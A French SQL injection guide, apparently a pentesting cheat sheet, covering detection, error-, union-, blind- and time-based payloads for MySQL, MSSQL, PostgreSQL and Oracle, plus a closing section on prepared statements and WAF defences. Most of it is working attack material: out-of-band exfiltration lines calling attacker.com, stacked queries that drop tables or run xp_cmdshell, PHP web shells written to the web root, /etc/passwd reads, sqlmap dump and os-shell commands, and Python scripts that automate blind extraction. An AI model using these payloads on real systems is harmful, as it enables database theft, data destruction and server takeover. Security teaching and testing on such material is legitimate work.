# 💉 SQL Injection - Guide Complet

Guide exhaustif pour détecter, exploiter et se protéger contre les injections SQL, une des vulnérabilités web les plus critiques.

---

## 📖 Concepts de Base

### Qu'est-ce qu'une SQL Injection ?

Une **SQL Injection (SQLi)** survient lorsqu'une application intègre des données utilisateur dans une requête SQL sans validation appropriée, permettant à un attaquant de :
- Contourner l'authentification
- Lire/modifier/supprimer des données
- Exécuter des commandes système (dans certains cas)
- Obtenir un accès complet à la base de données

**Exemple vulnérable** :
```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

---

## 1️⃣ Détection de SQL Injection

### Tests de base

**Dans un champ de texte ou URL :**
```sql
# Single quote (provoque une erreur)
'

# Double quote
"

# Commentaires SQL
'--
'#
'/*

# Logique booléenne
' OR '1'='1
' OR 1=1--
" OR 1=1--
' OR 'a'='a

# Parenthèses
')--
"))--

# Backslash
\'
\"
```

### Indicateurs de vulnérabilité

**Erreurs SQL visibles** :
```
You have an error in your SQL syntax
MySQL server version for the right syntax
Warning: mysql_fetch_array()
ODBC SQL Server Driver
Microsoft OLE DB Provider for SQL Server
```

**Changements de comportement** :
- Connexion réussie avec `' OR '1'='1`
- Page différente avec `' AND '1'='1` vs `' AND '1'='2`
- Délai de réponse avec `' AND SLEEP(5)--`

### Tests par type de paramètre

**URL GET** :
```
http://site.com/page.php?id=1'
http://site.com/page.php?id=1 OR 1=1--
http://site.com/page.php?id=1' UNION SELECT NULL--
```

**POST formulaire** :
```
username=admin'--
password=anything
```

**Headers HTTP** :
```
User-Agent: ' OR '1'='1
Referer: http://site.com' UNION SELECT NULL--
Cookie: sessionid=abc123' AND 1=1--
```

---

## 2️⃣ Types de SQL Injection

### A. Error-Based SQLi

**Principe** : Utiliser les messages d'erreur pour extraire des informations.

**MySQL** :
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--

' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--

' AND updatexml(null,concat(0x0a,(SELECT version())),null)--
```

**MSSQL** :
```sql
' AND 1=CONVERT(int,(SELECT @@version))--

' AND 1=CAST((SELECT @@version) AS int)--
```

**Oracle** :
```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
```

---

### B. Union-Based SQLi

**Principe** : Utiliser UNION pour combiner les résultats de deux requêtes.

**Étape 1 : Déterminer le nombre de colonnes**
```sql
' ORDER BY 1--    # Succès
' ORDER BY 2--    # Succès
' ORDER BY 3--    # Succès
' ORDER BY 4--    # Erreur = 3 colonnes

# Alternative : UNION SELECT
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--  # Succès = 3 colonnes
```

**Étape 2 : Identifier les colonnes affichées**
```sql
' UNION SELECT 1,2,3--
# Si "2" et "3" sont affichés, on peut utiliser ces colonnes
```

**Étape 3 : Extraire les données**
```sql
# Version de la base
' UNION SELECT NULL,@@version,NULL--          # MySQL/MSSQL
' UNION SELECT NULL,version(),NULL--           # PostgreSQL
' UNION SELECT NULL,banner,NULL FROM v$version--  # Oracle

# Base de données actuelle
' UNION SELECT NULL,database(),NULL--          # MySQL
' UNION SELECT NULL,db_name(),NULL--           # MSSQL
' UNION SELECT NULL,current_database(),NULL--  # PostgreSQL

# Lister les tables
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--

# Lister les colonnes d'une table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

# Extraire les données
' UNION SELECT NULL,username,password FROM users--

# Concaténer plusieurs colonnes
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

### C. Boolean-Based Blind SQLi

**Principe** : Pas de sortie directe, mais comportement différent selon TRUE/FALSE.

**Tests de base** :
```sql
# TRUE condition
' AND 1=1--      # Page normale
' AND 'a'='a'--

# FALSE condition
' AND 1=2--      # Page différente
' AND 'a'='b'--
```

**Extraction de données caractère par caractère** :
```sql
# Longueur du nom de base de données
' AND LENGTH(database())=1--  # False
' AND LENGTH(database())=2--  # False
' AND LENGTH(database())=8--  # True = 8 caractères

# Premier caractère du nom de base
' AND SUBSTRING(database(),1,1)='a'--  # False
' AND SUBSTRING(database(),1,1)='t'--  # True

# Deuxième caractère
' AND SUBSTRING(database(),2,1)='e'--  # True

# Automatisation recommandée avec sqlmap ou script
```

**Avec LIKE** :
```sql
' AND database() LIKE 't%'--     # True (commence par 't')
' AND database() LIKE 'te%'--    # True
' AND database() LIKE 'test%'--  # True
```

---

### D. Time-Based Blind SQLi

**Principe** : Pas de différence visible, mais délai de réponse différent.

**MySQL** :
```sql
# Test de base
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# Extraction de données
' AND IF(LENGTH(database())=8,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0)--

# Vérifier si admin existe
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')=1,SLEEP(5),0)--
```

**MSSQL** :
```sql
' WAITFOR DELAY '0:0:5'--
' IF (1=1) WAITFOR DELAY '0:0:5'--

# Extraction
' IF (LEN(DB_NAME())=8) WAITFOR DELAY '0:0:5'--
' IF (SUBSTRING(DB_NAME(),1,1)='t') WAITFOR DELAY '0:0:5'--
```

**PostgreSQL** :
```sql
' AND pg_sleep(5)--
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Oracle** :
```sql
' AND DBMS_LOCK.SLEEP(5)--
```

---

### E. Out-of-Band SQLi

**Principe** : Exfiltrer les données via requêtes DNS ou HTTP.

**MySQL (avec load_file)** :
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))--
```

**MSSQL (avec xp_dirtree)** :
```sql
'; EXEC master..xp_dirtree '\\attacker.com\'+@@version+'\'--
```

**Oracle (avec UTL_HTTP)** :
```sql
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual--
```

---

## 3️⃣ Énumération de Base de Données

### Informations système

**MySQL** :
```sql
# Version
SELECT @@version
SELECT version()

# Utilisateur actuel
SELECT user()
SELECT current_user()
SELECT system_user()

# Base de données actuelle
SELECT database()

# Liste des bases
SELECT schema_name FROM information_schema.schemata

# Datadir
SELECT @@datadir
```

**MSSQL** :
```sql
# Version
SELECT @@version

# Utilisateur
SELECT SUSER_NAME()
SELECT SYSTEM_USER
SELECT USER_NAME()

# Base actuelle
SELECT DB_NAME()

# Lister les bases
SELECT name FROM master..sysdatabases
```

**PostgreSQL** :
```sql
# Version
SELECT version()

# Utilisateur
SELECT current_user

# Base actuelle
SELECT current_database()

# Lister les bases
SELECT datname FROM pg_database
```

**Oracle** :
```sql
# Version
SELECT banner FROM v$version

# Utilisateur
SELECT user FROM dual

# Lister les tables
SELECT table_name FROM all_tables
```

---

### Énumération des tables et colonnes

**MySQL** :
```sql
# Lister toutes les tables
SELECT table_schema,table_name FROM information_schema.tables

# Tables de la base actuelle
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

# Colonnes d'une table
SELECT column_name FROM information_schema.columns WHERE table_name='users'

# Avec types de données
SELECT column_name,data_type FROM information_schema.columns WHERE table_name='users'
```

**MSSQL** :
```sql
# Lister les tables
SELECT name FROM sysobjects WHERE xtype='U'
SELECT table_name FROM information_schema.tables

# Colonnes
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

**PostgreSQL** :
```sql
# Lister les tables
SELECT tablename FROM pg_tables WHERE schemaname='public'

# Colonnes
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 4️⃣ Techniques Avancées

### Bypass de filtres

**Encodage** :
```sql
# URL encoding
%27 = '
%23 = #
%2D%2D = --

# Double encoding
%2527 = %27 = '

# Unicode
%u0027 = '
```

**Casse** :
```sql
# Mixed case
' UnIoN SeLeCt NULL--
' uNiOn sElEcT NULL--
```

**Commentaires inline** :
```sql
'/**/UNION/**/SELECT/**/NULL--
'/*!UNION*//*!SELECT*/NULL--
'UNION/*comment*/SELECT/**/NULL--
```

**Whitespace alternatives** :
```sql
# Tab, newline
'UNION%09SELECT%09NULL--
'UNION%0ASELECT%0ANULL--

# Commentaires
'UNION/**/SELECT/**/NULL--
```

**Bypass de quotes** :
```sql
# Hexadécimal
' UNION SELECT 0x61646d696e--  # 'admin' en hex

# CHAR()
' UNION SELECT CHAR(97,100,109,105,110)--  # 'admin'

# Concaténation
' UNION SELECT CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))--
```

**Bypass de espaces** :
```sql
'UNION+SELECT+NULL--
'UNION%20SELECT%20NULL--
'UNION/**/SELECT/**/NULL--
'UNION%09SELECT%09NULL--
```

---

### Stacked Queries

**MSSQL et PostgreSQL** (supportent les queries multiples) :
```sql
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','password')--
'; UPDATE users SET password='hacked' WHERE username='admin'--

# MSSQL - xp_cmdshell
'; EXEC xp_cmdshell('whoami')--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

---

### Reading/Writing Files

**MySQL** :
```sql
# Lire un fichier
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),NULL,NULL--

# Écrire un fichier (nécessite FILE privilege)
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--

# Secure_file_priv check
SELECT @@secure_file_priv--
```

**MSSQL** :
```sql
# Lire un fichier
' UNION SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts',SINGLE_CLOB) AS x--

# Écrire (via xp_cmdshell)
'; EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php'--
```

**PostgreSQL** :
```sql
# Lire un fichier
' UNION SELECT pg_read_file('/etc/passwd',0,200000),NULL--

# Copier vers un fichier
'; COPY (SELECT 'test') TO '/tmp/output.txt'--
```

---

### Second-Order SQLi

**Principe** : L'injection est stockée puis exécutée plus tard.

**Exemple** :
```sql
# Inscription avec username malveillant
username: admin'--
password: test123

# Plus tard, lors d'une mise à jour de profil
UPDATE users SET email='new@email.com' WHERE username='admin'--'
# Devient : UPDATE users SET email='new@email.com' WHERE username='admin'
# Le reste est commenté, affectant potentiellement l'admin
```

---

## 5️⃣ Exploitation avec SQLMap

### Commandes de base

```bash
# Test simple
sqlmap -u "http://site.com/page.php?id=1"

# Avec cookie
sqlmap -u "http://site.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# POST request
sqlmap -u "http://site.com/login.php" --data="username=admin&password=test"

# Depuis un fichier de requête Burp
sqlmap -r request.txt

# Batch mode (automatique)
sqlmap -u "http://site.com/page.php?id=1" --batch

# Level et risk
sqlmap -u "http://site.com/page.php?id=1" --level=5 --risk=3
```

### Énumération

```bash
# Lister les bases de données
sqlmap -u "http://site.com/page.php?id=1" --dbs

# Base actuelle
sqlmap -u "http://site.com/page.php?id=1" --current-db

# Utilisateur actuel
sqlmap -u "http://site.com/page.php?id=1" --current-user

# Lister les tables d'une base
sqlmap -u "http://site.com/page.php?id=1" -D database_name --tables

# Lister les colonnes d'une table
sqlmap -u "http://site.com/page.php?id=1" -D database_name -T users --columns

# Dump d'une table
sqlmap -u "http://site.com/page.php?id=1" -D database_name -T users --dump

# Dump de colonnes spécifiques
sqlmap -u "http://site.com/page.php?id=1" -D database_name -T users -C username,password --dump

# Dump de toute la base
sqlmap -u "http://site.com/page.php?id=1" -D database_name --dump-all
```

### Techniques avancées

```bash
# Forcer une technique spécifique
sqlmap -u "http://site.com/page.php?id=1" --technique=U  # Union-based

# Techniques disponibles :
# B: Boolean-based blind
# E: Error-based
# U: Union query-based
# S: Stacked queries
# T: Time-based blind
# Q: Inline queries

# Bypass WAF
sqlmap -u "http://site.com/page.php?id=1" --tamper=space2comment
sqlmap -u "http://site.com/page.php?id=1" --random-agent

# Scripts tamper courants :
# apostrophemask.py
# base64encode.py
# between.py
# charencode.py
# space2comment.py

# OS Shell
sqlmap -u "http://site.com/page.php?id=1" --os-shell

# SQL Shell
sqlmap -u "http://site.com/page.php?id=1" --sql-shell

# Lire un fichier
sqlmap -u "http://site.com/page.php?id=1" --file-read="/etc/passwd"

# Écrire un fichier
sqlmap -u "http://site.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### Optimisation

```bash
# Threads (plus rapide)
sqlmap -u "http://site.com/page.php?id=1" --threads=10

# Skip certains tests
sqlmap -u "http://site.com/page.php?id=1" --skip-waf --skip-urlencode

# Reprendre une session
sqlmap -u "http://site.com/page.php?id=1" --flush-session

# Verbose
sqlmap -u "http://site.com/page.php?id=1" -v 3
```

---

## 6️⃣ Exploitation Manuelle

### Script Python pour Boolean-Based

```python
import requests
import string

url = "http://site.com/page.php?id=1"
charset = string.ascii_lowercase + string.digits + '_'

# Extraire le nom de la base de données
database_name = ""
for i in range(1, 20):
    for char in charset:
        payload = f"' AND SUBSTRING(database(),{i},1)='{char}'--"
        r = requests.get(url + payload)
        if "Success" in r.text:  # Indicateur de TRUE
            database_name += char
            print(f"[+] Character found: {char}")
            break
    else:
        break

print(f"[+] Database name: {database_name}")
```

### Script Python pour Time-Based

```python
import requests
import time

url = "http://site.com/page.php?id=1"

def check_true(payload):
    start = time.time()
    requests.get(url + payload)
    return (time.time() - start) > 5

# Test
if check_true("' AND SLEEP(5)--"):
    print("[+] Time-based SQLi confirmed")

# Extraction
database_name = ""
for i in range(1, 20):
    for ascii_val in range(32, 127):
        char = chr(ascii_val)
        payload = f"' AND IF(SUBSTRING(database(),{i},1)='{char}',SLEEP(5),0)--"
        if check_true(payload):
            database_name += char
            print(f"[+] Character found: {char}")
            break
    else:
        break

print(f"[+] Database name: {database_name}")
```

---

## 7️⃣ Protection et Mitigation

### Bonnes pratiques de développement

**1. Requêtes préparées (Prepared Statements)**

**PHP (PDO)** :
```php
// VULNÉRABLE
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

// SÉCURISÉ
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

**PHP (MySQLi)** :
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

**Python** :
```python
# VULNÉRABLE
cursor.execute(f"SELECT * FROM users WHERE username='{username}'")

# SÉCURISÉ
cursor.execute("SELECT * FROM users WHERE username=?", (username,))
```

**Node.js** :
```javascript
// VULNÉRABLE
connection.query(`SELECT * FROM users WHERE username='${username}'`)

// SÉCURISÉ
connection.query('SELECT * FROM users WHERE username=?', [username])
```

**2. Validation des entrées**
```php
// Valider type de données
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

// Whitelist
$allowed_columns = ['id', 'username', 'email'];
if (!in_array($sort_by, $allowed_columns)) {
    die("Invalid column");
}
```

**3. Échapper les caractères spéciaux**
```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

**4. Principe du moindre privilège**
```sql
-- Ne pas utiliser root pour l'application
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'appuser'@'localhost';

-- Pas de FILE privilege
REVOKE FILE ON *.* FROM 'appuser'@'localhost';
```

---

### Web Application Firewall (WAF)

**ModSecurity** :
```apache
# Core Rule Set
SecRule REQUEST_URI|ARGS "@detectSQLi" "id:1,deny,log,status:403"
```

**Cloudflare** :
- Active la protection SQL Injection
- Mode "I'm Under Attack" pour attaques actives

---

### Détection et Monitoring

```sql
-- Activer le logging MySQL
SET GLOBAL general_log = 'ON';
SET GLOBAL log_output = 'FILE';

-- Monitorer les requêtes suspectes
grep -i "union\|select\|insert\|update\|delete\|drop" /var/log/mysql/general.log
```

**SIEM/IDS** :
- Snort rules pour SQLi
- Règles Suricata
- Monitoring avec ELK stack

---

## 8️⃣ Cheatsheet Rapide

```sql
# Détection
'
' OR '1'='1
' AND 1=1--
' AND SLEEP(5)--

# Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,@@version,NULL--

# Boolean-based
' AND 1=1--  # True
' AND 1=2--  # False

# Time-based
' AND SLEEP(5)--        # MySQL
' WAITFOR DELAY '0:0:5'--  # MSSQL
' AND pg_sleep(5)--     # PostgreSQL

# Énumération
' UNION SELECT NULL,database(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username,password FROM users--

# SQLMap
sqlmap -u "URL" --dbs
sqlmap -u "URL" -D database --tables
sqlmap -u "URL" -D database -T users --dump
```

---

## 📚 Ressources

- **OWASP SQL Injection** : https://owasp.org/www-community/attacks/SQL_Injection
- **PortSwigger SQL Injection** : https://portswigger.net/web-security/sql-injection
- **HackTricks SQLi** : https://book.hacktricks.xyz/pentesting-web/sql-injection
- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- **SQLMap Documentation** : https://github.com/sqlmapproject/sqlmap/wiki

---

**Tags:** `#sql-injection #sqli #web #database #union #blind #sqlmap #enumeration`
